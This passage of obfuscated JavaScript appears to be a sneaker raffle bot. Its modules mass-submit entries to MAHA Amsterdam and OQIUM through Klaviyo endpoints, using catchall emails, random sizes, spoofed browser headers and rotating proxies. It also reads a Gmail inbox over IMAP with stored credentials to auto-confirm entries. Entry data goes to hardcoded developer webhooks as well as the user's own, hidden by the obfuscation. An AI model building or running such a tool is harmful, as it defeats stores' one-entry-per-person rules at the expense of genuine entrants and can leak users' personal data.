                            _0xadb0e3['errorDEV'] = { 'embeds': [_0x4c716f] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0xadb0e3['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0xadb0e3['errorDEV']), _0x11ef14 = 'yes';
                        } finally {
                            _0x59a3ba && _0x59a3ba['close']();
                            if (_0x11ef14 == 'yes' && _0x4115e6 != 0x5) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Retrying')), _0xfe193b = _0xfe193b - 0x1, _0x4115e6 = _0x4115e6 + 0x1;
                                continue;
                            }
                            _0x11ef14 == 'yes' && _0x4115e6 >= 0x5 && (_0xc1caad(_0x1ba690[_0xfe193b], _0x299751), _0x11ef14 = 'no', _0x4115e6 = 0x0), console['log']('Waiting\x20for\x20' + _0x8702f0['AfewDelay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1d79fa, _0xaf13be, _0x5044b0) {
                    for (var _0x1e715a = 0x0; _0x1e715a < _0xaf13be['length']; _0x1e715a++) {
                        async function _0xa7fc52(_0x335df5, _0xca37a1, _0x4c248b, _0x9d29f5, _0x41d09e) {
                            var _0x5a0512, _0x5ed361 = {}, _0xb0df0e = [], _0x19cd4d = {}, _0x2654bb = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x574b8a = Math['round'](Math['random']() * (_0x2654bb['length'] - 0x1));
                            !_0x9d29f5 && (_0x9d29f5 = {});
                            if (_0xca37a1 != 'ver') {
                                _0x16d703(_0x4c248b['name'] + '\x20Task\x20' + (_0x335df5 + 0x1) + '\x20/\x20' + _0x9d29f5['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x9d29f5, _0x335df5), _0x5ed361 = _0x4c248b['data'];
                                _0xca37a1 == 'exp' ? _0x5ed361['data']['attributes']['email'] = '' + _0x9d29f5[_0x335df5]['FirstName'] + _0x9d29f5[_0x335df5]['LastName'] + _0x8702f0['catchall'] : _0x5ed361['data']['attributes']['email'] = '' + _0x9d29f5[_0x335df5]['Email'];
                                if (_0x9d29f5[_0x335df5]['Size'] == 'RANDOM') {
                                }
                                _0x5ed361['data']['attributes']['properties']['$first_name'] = '' + _0x9d29f5[_0x335df5]['FirstName'], _0x5ed361['data']['attributes']['properties']['$last_name'] = '' + _0x9d29f5[_0x335df5]['LastName'], _0x5ed361['data']['attributes']['properties']['$address1'] = _0x9d29f5[_0x335df5]['Address1'] + '\x20' + _0x9d29f5[_0x335df5]['Address2'] + '\x20' + _0x9d29f5[_0x335df5]['HouseNumber'], _0x5ed361['data']['attributes']['properties']['$zip'] = '' + _0x9d29f5[_0x335df5]['Zip'], _0x5ed361['data']['attributes']['properties']['$city'] = '' + _0x9d29f5[_0x335df5]['City'], _0x5ed361['data']['attributes']['properties']['$country'] = '' + _0x9d29f5[_0x335df5]['Country'], _0x9d29f5[_0x335df5]['Size'] == 'RANDOM' ? _0x5ed361['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2654bb[_0x574b8a] : _0x5ed361['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x9d29f5[_0x335df5]['Size'], _0x5ed361['data']['attributes']['properties']['$phone_number'] = '' + _0x9d29f5[_0x335df5]['Phone'], _0x5ed361['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x9d29f5[_0x335df5]['Follower'];
                            }
                            if (_0x8702f0['useRandomProxy'] = ![])
                                var _0x1fc97a = _0x41d09e[_0x335df5]['split'](':');
                            else
                                var _0x5d31d7 = Math['round'](Math['random']() * (_0x41d09e['length'] - 0x1)), _0x1fc97a = _0x41d09e[_0x5d31d7]['split'](':');
                            var _0x3e5081 = {
                                'jar': _0x44b991,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x4c248b['url'],
                                'headers': _0x4c248b['headers'],
                                'body': JSON['stringify'](_0x5ed361),
                                'proxy': 'http://' + _0x1fc97a[0x2] + ':' + _0x1fc97a[0x3] + '@' + _0x1fc97a[0x0] + ':' + _0x1fc97a[0x1]
                            };
                            return _0xca37a1 != 'ver' && (_0x3e5081['url'] = _0x4c248b['url'], _0x3e5081['headers'] = _0x4c248b['headers']), _0xca37a1 == 'ver' && (_0x3e5081['method'] = 'GET'), new Promise(function (_0x15d121, _0x39aa94) {
                                callback = async (_0x44df94, _0xc6caa8, _0x25afaa) => {
                                    if (!_0x44df94 && _0xc6caa8['statusCode'] == 0xca || !_0x44df94 && _0xc6caa8['statusCode'] == 0xc8) {
                                        if (_0xca37a1 != 'ver') {
                                            var _0x503ca1 = await _0x296449(_0x9d29f5[_0x335df5], _0x4c248b, 'dev', ![]), _0x1d5ceb = await _0x296449(_0x9d29f5[_0x335df5], _0x4c248b, 'pub', ![]);
                                            const _0x4d1e1d = {
                                                'succesDEVMSG': { 'embeds': [_0x503ca1] },
                                                'succesPUBMSG': { 'embeds': [_0x1d5ceb] }
                                            };
                                            if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                                                try {
                                                    await _0x10a0d6(_0x8702f0['webhook'], _0x4d1e1d['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x4d1e1d['succesDEVMSG']), await _0x7e80ad(0xc8);
                                            try {
                                                await _0x10a0d6(_0x355433, _0x4d1e1d['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x4bdc1f(_0x9d29f5[_0x335df5], _0x4c248b);
                                        }
                                        _0x15d121(console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x4c248b['name'] + ']\x20Task\x20' + (_0x335df5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xca37a1 != 'ver') {
                                            var _0x21e740 = '' + _0x44df94, _0x279bca = await _0x296449(_0x9d29f5[_0x335df5], _0x4c248b, 'dev', !![], _0x21e740), _0x1b7a6c = {};
                                            _0x1b7a6c['errorDEV'] = { 'embeds': [_0x279bca] }, _0xc1caad(_0x9d29f5[_0x335df5], _0x4c248b), _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x1b7a6c['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x1b7a6c['errorDEV']);
                                        }
                                        _0x39aa94(console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x4c248b['name'] + ']\x20Task\x20' + (_0x335df5 + 0x1) + ':\x20' + _0x44df94)));
                                    }
                                };
                                try {
                                    _0xca37a1 != 'ver' && console['log'](_0x441ea7() + '\x20[' + _0x4c248b['name'] + ']\x20Task\x20' + (_0x335df5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5ed361['data']['attributes']['email']), _0x394d0f(_0x3e5081, callback);
                                } catch (_0x387cb7) {
                                    console['log'](_0x441ea7() + '\x20Task\x20' + (_0x335df5 + 0x1) + ':\x20' + _0x387cb7);
                                }
                            });
                        }
                        ;
                        try {
                            await _0xa7fc52(_0x1e715a, 'nor', _0x1d79fa, _0xaf13be, _0x5044b0), console['log'](_0x441ea7() + '\x20[' + _0x1d79fa['name'] + ']\x20Sleeping\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        } catch (_0xbad525) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x392e1b, _0x3eace8, _0x1091b1) {
                    var _0x1dfa1b = [], _0x10a653 = ![];
                    async function _0x134eeb() {
                        var _0x33e928 = new _0x3602ef({
                            'user': _0x8702f0['masterMail'],
                            'password': _0x8702f0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x482658(_0x33946a) {
                            _0x33e928['openBox']('INBOX', ![], _0x33946a);
                        }
                        _0x33e928['once']('ready', function () {
                            _0x482658(function (_0x138cce, _0xd0e335) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x138cce)
                                    throw _0x138cce;
                                _0x33e928['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x33e406, _0x5b1dbd) {
                                    if (!_0x5b1dbd || !_0x5b1dbd['length'])
                                        console['log'](_0x441ea7() + '\x20[' + _0x392e1b['name'] + ']\x20No\x20mails\x20found'), _0x33e928['end']();
                                    else {
                                        var _0x517342 = _0x33e928['seq']['fetch'](_0x5b1dbd, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x517342['on']('message', function (_0x549c1c, _0x36791a) {
                                            var _0x19da7f = '(#' + _0x36791a + ')\x20';
                                            _0x549c1c['on']('body', function (_0x365b1d, _0xd4a9a) {
                                                _0x40c426(_0x365b1d, (_0x8a67e4, _0x39d669) => {
                                                    var _0x3efc28 = _0x39d669['text']['split']('(')[0x1], _0x29474d = _0x3efc28['split'](')')[0x0];
                                                    _0x1dfa1b['push'](_0x29474d);
                                                });
                                            }), _0x549c1c['once']('end', function () {
                                            });
                                        }), _0x517342['once']('error', function (_0x591ad5) {
                                            console['log']('Fetch\x20error:\x20' + _0x591ad5), _0x10a653 = !![];
                                        }), _0x517342['once']('end', function () {
                                            _0x33e928['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x33e928['once']('error', function (_0x2b90e3) {
                            console['log'](_0x1a235e['red'](_0x2b90e3['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x10a653 = !![];
                        }), _0x33e928['once']('end', async function () {
                            _0x10a653 = !![];
                        }), _0x33e928['connect']();
                    }
                    async function _0x2b2ac4(_0x84fa4, _0x31c39e, _0x39578e) {
                        for (var _0x7e3b42 = 0x0; _0x7e3b42 < _0x31c39e['length']; _0x7e3b42++) {
                            async function _0x1ec236(_0x366c95, _0x598dc7, _0xcaada8, _0x15adff, _0x28a481) {
                                var _0x107f57, _0x809671 = {}, _0x1b7a2f = [], _0x4d9770 = {}, _0x46e609 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x476b6c = Math['round'](Math['random']() * (_0x46e609['length'] - 0x1));
                                _0x15adff[_0x366c95]['Size'] == 'RANDOM' && (_0x15adff[_0x366c95]['Size'] = _0x46e609[_0x476b6c]);
                                !_0x15adff && (_0x15adff = {});
                                if (_0x8702f0['useRandomProxy'] = ![])
                                    var _0x2f16d3 = _0x28a481[_0x366c95]['split'](':');
                                else
                                    var _0x1cbe22 = Math['round'](Math['random']() * (_0x28a481['length'] - 0x1)), _0x2f16d3 = _0x28a481[_0x1cbe22]['split'](':');
                                var _0x1ceec6 = {
                                    'jar': _0x44b991,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xcaada8['url'],
                                    'headers': _0xcaada8['headers'],
                                    'body': JSON['stringify'](_0x809671),
                                    'proxy': 'http://' + _0x2f16d3[0x2] + ':' + _0x2f16d3[0x3] + '@' + _0x2f16d3[0x0] + ':' + _0x2f16d3[0x1]
                                };
                                return _0x598dc7 != 'ver' && (_0x1ceec6['url'] = _0xcaada8['url'], _0x1ceec6['headers'] = _0xcaada8['headers']), _0x598dc7 == 'ver' && (_0x1ceec6['method'] = 'GET', _0x1ceec6['url'] = _0x15adff[_0x366c95]), new Promise(function (_0x3f71a6, _0x18f870) {
                                    callback = async (_0x4c0fcb, _0x531c88, _0x53a392) => {
                                        if (!_0x4c0fcb && _0x531c88['statusCode'] == 0xca || !_0x4c0fcb && _0x531c88['statusCode'] == 0xc8) {
                                            if (_0x598dc7 != 'ver') {
                                                var _0x4968d1 = await _0x296449(_0x15adff[_0x366c95], _0xcaada8, 'dev', ![]), _0x23f01e = await _0x296449(_0x15adff[_0x366c95], _0xcaada8, 'pub', ![]);
                                                const _0x3a8b80 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4968d1] },
                                                    'succesPUBMSG': { 'embeds': [_0x23f01e] }
                                                };
                                                if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                                                    try {
                                                        await _0x10a0d6(_0x8702f0['webhook'], _0x3a8b80['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x3a8b80['succesDEVMSG']), await _0x7e80ad(0xc8);
                                                try {
                                                    await _0x10a0d6(_0x355433, _0x3a8b80['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4bdc1f(_0x15adff[_0x366c95], _0xcaada8);
                                            }
                                            _0x3f71a6(console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0xcaada8['name'] + ']\x20Task\x20' + (_0x366c95 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x598dc7 != 'ver') {
                                                var _0x290b62 = '' + _0x4c0fcb, _0x184c9d = await _0x296449(_0x15adff[_0x366c95], _0xcaada8, 'dev', !![], _0x290b62), _0x5942bf = {};
                                                _0x5942bf['errorDEV'] = { 'embeds': [_0x184c9d] }, _0xc1caad(_0x15adff[_0x366c95], _0xcaada8), _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x5942bf['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x5942bf['errorDEV']);
                                            }
                                            _0x18f870(console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0xcaada8['name'] + ']\x20Task\x20' + (_0x366c95 + 0x1) + ':\x20' + _0x4c0fcb)));
                                        }
                                    };
                                    try {
                                        _0x598dc7 != 'ver' ? console['log'](_0x441ea7() + '\x20[' + _0xcaada8['name'] + ']\x20Task\x20' + (_0x366c95 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x809671['data']['attributes']['email']) : console['log'](_0x441ea7() + '\x20[' + _0xcaada8['name'] + ']\x20Task\x20' + (_0x366c95 + 0x1) + ':\x20Fetching\x20Response'), _0x394d0f(_0x1ceec6, callback);
                                    } catch (_0x46e95d) {
                                        console['log'](_0x441ea7() + '\x20Task\x20' + (_0x366c95 + 0x1) + ':\x20' + _0x46e95d);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1ec236(_0x7e3b42, 'ver', _0x84fa4, _0x31c39e, _0x39578e), console['log'](_0x441ea7() + '\x20[' + _0x84fa4['name'] + ']\x20Sleeping\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                            } catch (_0x5b5548) {
                            }
                        }
                    }
                    try {
                        _0x134eeb();
                        while (!_0x10a653) {
                            await _0x7e80ad(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1dfa1b['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x7e80ad(0x9c4);
                    }
                    await _0x2b2ac4(_0x392e1b, _0x1dfa1b, _0x1091b1);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YAQ4Ja',
                            'custom_source': 'DN3707-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TntaQ5',
                                '$consent_form_version': 0x81b1d1,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x248201, _0x511dbb, _0x52e132) {
                    for (var _0x3c257f = 0x0; _0x3c257f < _0x511dbb['length']; _0x3c257f++) {
                        async function _0x1679f4(_0x307417, _0x3cc335, _0x125b19, _0x511518, _0x5b0214) {
                            var _0x2b3da6, _0x502dbc = {}, _0x5015f7 = [], _0x504284 = {}, _0x3b0662 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1373c5 = Math['round'](Math['random']() * (_0x3b0662['length'] - 0x1));
                            !_0x511518 && (_0x511518 = {});
                            if (_0x3cc335 != 'ver') {
                                _0x16d703(_0x125b19['name'] + '\x20Task\x20' + (_0x307417 + 0x1) + '\x20/\x20' + _0x511518['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x511518, _0x307417), _0x5015f7 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x397af7
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x511518[_0x307417]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x8702f0['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x4a89e9
                                        }
                                    ]
                                }], _0x504284 = { 'embeds': _0x5015f7 }, _0x502dbc = _0x125b19['data'];
                                _0x3cc335 == 'exp' ? _0x502dbc['data']['attributes']['email'] = '' + _0x511518[_0x307417]['FirstName'] + _0x511518[_0x307417]['LastName'] + _0x8702f0['catchall'] : _0x502dbc['data']['attributes']['email'] = '' + _0x511518[_0x307417]['Email'];
                                if (_0x511518[_0x307417]['Size'] == 'RANDOM') {
                                }
                                _0x502dbc['data']['attributes']['properties']['$first_name'] = '' + _0x511518[_0x307417]['FirstName'], _0x502dbc['data']['attributes']['properties']['$last_name'] = '' + _0x511518[_0x307417]['LastName'], _0x502dbc['data']['attributes']['properties']['$address1'] = _0x511518[_0x307417]['Address1'] + '\x20' + _0x511518[_0x307417]['Address2'] + '\x20' + _0x511518[_0x307417]['HouseNumber'], _0x502dbc['data']['attributes']['properties']['$zip'] = '' + _0x511518[_0x307417]['Zip'], _0x502dbc['data']['attributes']['properties']['$city'] = '' + _0x511518[_0x307417]['City'], _0x502dbc['data']['attributes']['properties']['$country'] = '' + _0x511518[_0x307417]['Country'], _0x511518[_0x307417]['Size'] == 'RANDOM' ? _0x502dbc['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3b0662[_0x1373c5] : _0x502dbc['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x511518[_0x307417]['Size'], _0x502dbc['data']['attributes']['properties']['$phone_number'] = '' + _0x511518[_0x307417]['Phone'], _0x502dbc['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x511518[_0x307417]['Follower'];
                            }
                            if (_0x8702f0['useRandomProxy'] = ![])
                                var _0x3e6efa = _0x5b0214[_0x307417]['split'](':');
                            else
                                var _0x599f71 = Math['round'](Math['random']() * (_0x5b0214['length'] - 0x1)), _0x3e6efa = _0x5b0214[_0x599f71]['split'](':');
                            var _0x128247 = {
                                'jar': _0x44b991,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x125b19['url'],
                                'headers': _0x125b19['headers'],
                                'body': JSON['stringify'](_0x502dbc),
                                'proxy': 'http://' + _0x3e6efa[0x2] + ':' + _0x3e6efa[0x3] + '@' + _0x3e6efa[0x0] + ':' + _0x3e6efa[0x1]
                            };
                            return _0x3cc335 != 'ver' && (_0x128247['url'] = _0x125b19['url'], _0x128247['headers'] = _0x125b19['headers']), _0x3cc335 == 'ver' && (_0x128247['method'] = 'GET'), new Promise(function (_0x20ca4c, _0x1727cc) {
                                callback = async (_0x1e8bba, _0x595325, _0x149987) => {
                                    if (!_0x1e8bba && _0x595325['statusCode'] == 0xca || !_0x1e8bba && _0x595325['statusCode'] == 0xc8) {
                                        if (_0x3cc335 != 'ver') {
                                            var _0xed7d8 = await _0x296449(_0x511518[_0x307417], _0x125b19, 'dev', ![]), _0x2e0dc7 = await _0x296449(_0x511518[_0x307417], _0x125b19, 'pub', ![]);
                                            const _0x44f253 = {
                                                'succesDEVMSG': { 'embeds': [_0xed7d8] },
                                                'succesPUBMSG': { 'embeds': [_0x2e0dc7] }
                                            };
                                            if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                                                try {
                                                    await _0x10a0d6(_0x8702f0['webhook'], _0x44f253['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x44f253['succesDEVMSG']), await _0x7e80ad(0xc8);
                                            try {
                                                await _0x10a0d6(_0x355433, _0x44f253['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x4bdc1f(_0x511518[_0x307417], _0x125b19);
                                        }
                                        _0x20ca4c(console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x125b19['name'] + ']\x20Task\x20' + (_0x307417 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3cc335 != 'ver') {
                                            var _0x30bb18 = '' + _0x1e8bba, _0x51d52d = await _0x296449(_0x511518[_0x307417], _0x125b19, 'dev', !![], _0x30bb18), _0x2a3d37 = {};
                                            _0x2a3d37['errorDEV'] = { 'embeds': [_0x51d52d] }, _0xc1caad(_0x511518[_0x307417], _0x125b19), _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x2a3d37['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x2a3d37['errorDEV']);
                                        }
                                        _0x1727cc(console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x125b19['name'] + ']\x20Task\x20' + (_0x307417 + 0x1) + ':\x20' + _0x1e8bba)));
                                    }
                                };
                                try {
                                    _0x3cc335 != 'ver' && console['log'](_0x441ea7() + '\x20[' + _0x125b19['name'] + ']\x20Task\x20' + (_0x307417 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x502dbc['data']['attributes']['email']), _0x394d0f(_0x128247, callback);
                                } catch (_0x39ba1f) {
                                    console['log'](_0x441ea7() + '\x20Task\x20' + (_0x307417 + 0x1) + ':\x20' + _0x39ba1f);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1679f4(_0x3c257f, 'nor', _0x248201, _0x511dbb, _0x52e132), console['log'](_0x441ea7() + '\x20[' + _0x248201['name'] + ']\x20Sleeping\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        } catch (_0x16200a) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
